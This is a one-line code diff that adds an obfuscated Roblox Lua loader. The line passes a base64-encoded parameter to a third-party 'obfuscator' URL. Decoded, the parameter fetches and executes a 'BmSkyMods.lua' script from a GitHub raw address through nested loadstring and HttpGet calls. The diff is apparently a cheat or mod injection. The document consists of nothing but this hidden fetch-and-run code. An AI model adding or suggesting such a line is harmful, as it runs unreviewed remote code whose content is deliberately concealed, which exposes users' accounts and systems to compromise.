@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://roblox-obfuscator.vercel.app/api/script?c=bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iaW1hMDg1NjYtZW5nL3JvYmxveC9yZWZzL2hlYWRzL21haW4vQm1Ta3lNb2RzLmx1YSIpKSgp'))()
